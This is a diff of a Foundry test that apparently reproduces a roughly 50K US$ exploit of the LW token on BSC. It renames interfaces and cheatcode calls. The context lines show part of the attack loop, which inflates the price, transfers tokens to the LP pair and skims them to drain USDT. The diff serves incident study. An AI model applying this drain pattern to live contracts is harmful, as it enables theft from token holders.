@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~50K US$
 // Attacker : https://bscscan.com/address/0x4404de29913e0fd055190e680771a016777973e5
@@ -31,21 +30,19 @@ contract ContractTest is Test {
 
     ILW LW = ILW(payable(0x7B8C378df8650373d82CeB1085a18FE34031784F));
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
-    Uni_Pair_V2 Pair = Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
-    Uni_Pair_V2 LP = Uni_Pair_V2(0x6D2D124acFe01c2D2aDb438E37561a0269C6eaBB);
-    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Pair Pair = IUniswapV2Pair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
+    IUniswapV2Pair LP = IUniswapV2Pair(0x6D2D124acFe01c2D2aDb438E37561a0269C6eaBB);
+    IUniswapV2Router Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     address marketAddr = 0xae2f168900D5bb38171B01c2323069E5FD6b57B9;
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() public {
-        cheats.createSelectFork("bsc", 28_133_285);
-        cheats.label(address(USDT), "USDT");
-        cheats.label(address(LW), "LW");
-        cheats.label(address(LP), "LP");
-        cheats.label(address(Pair), "Pair");
-        cheats.label(address(Router), "Router");
-        cheats.label(address(marketAddr), "marketAddr");
+        vm.createSelectFork("bsc", 28_133_285);
+        vm.label(address(USDT), "USDT");
+        vm.label(address(LW), "LW");
+        vm.label(address(LP), "LP");
+        vm.label(address(Pair), "Pair");
+        vm.label(address(Router), "Router");
+        vm.label(address(marketAddr), "marketAddr");
     }
 
     function testExploit() public {
@@ -60,7 +57,7 @@ contract ContractTest is Test {
         USDTToLW();
         while (USDT.balanceOf(marketAddr) > 3000 * 1e18) {
             LW.thanPrice();
-            uint256 transferAmount = 2510e18 * 1e18 / LW.getTokenPrice();
+            uint256 transferAmount = (2510e18 * 1e18) / LW.getTokenPrice();
             LW.transfer(address(LP), transferAmount);
             LW.thanPrice();
             LP.skim(address(this));
